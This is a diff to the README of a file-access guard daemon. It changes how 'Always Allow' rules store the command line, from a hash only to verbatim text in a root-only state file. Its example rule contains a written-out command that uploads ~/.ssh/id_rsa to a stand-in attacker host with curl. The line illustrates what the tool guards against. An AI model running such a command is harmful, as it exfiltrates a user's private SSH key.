@@ -220,21 +220,21 @@ Clicking **Always Allow** stores a fingerprinted entry in the daemon's in-memory
 | **Call chain** (up to 3 ancestors) | Prevents a different caller from inheriting the rule |
 | **SHA-512 of each ancestor exe** | Detects replaced parent binaries |
 | **Target file** | Least privilege: approving `kubectl` for `~/.kube/config` does not grant `~/.ssh/id_rsa` |
-| **Command line** (SHA-512 fingerprint) | Only the exact invocation, arguments included, stays silent: `kubectl get pods` does not authorize `kubectl get secrets` |
+| **Command line** (stored, matched by SHA-512) | Only the exact invocation, arguments included, stays silent: `kubectl get pods` does not authorize `kubectl get secrets` |
 
 **Example:** clicking *Always Allow* for the popup shown above records:
 
 ```text
 binary:         /usr/bin/curl     (sha512: a3f1…)
 target:         /home/user/.ssh/id_rsa
-command:        curl -s https://evil.example.com … (fingerprinted, not stored)
+command:        curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
 parent[0]:      bash              (sha512: 7c82…)
 parent[1]:      systemd           (sha512: 0d4e…)
 ```
 
 A future `curl` call from `zsh` instead of `bash` will prompt again because the call chain differs. A trojaned `/usr/bin/curl` will also prompt again because its SHA-512 has changed. The same binary reading `~/.aws/credentials` prompts because the target differs, and invoking it with different arguments (e.g. `kubectl get pods` vs `kubectl get secrets`) prompts because the command line differs.
 
-> Only a SHA-512 fingerprint of the command line is persisted — arguments are never written to disk, so secrets passed on the command line do not end up in the state file. State entries written by older versions without a `target_path` or without a command fingerprint are dropped at load (fail closed) and the access is prompted again.
+> The command line is stored verbatim in the root-only (0600) state file so entries can be reviewed, and its SHA-512 is the matching key. Arguments may therefore contain secrets (`-p…`, tokens); the state file is readable only by root, but treat it accordingly. State entries written by older versions without a `target_path` or a command line are dropped at load (fail closed) and the access is prompted again.
 
 #### Persistence
 
@@ -260,7 +260,7 @@ sudo rm /var/lib/fileshield/runtime-denylist.json
 sudo systemctl restart fileshield
 ```
 
-To view the current persisted entries (`fileshield-cli list` shows a short fingerprint of the bound command line):
+To view the current persisted entries (`fileshield-cli list` shows the stored command line for each entry):
 
 ```bash
 cat /var/lib/fileshield/runtime-allowlist.json | jq .
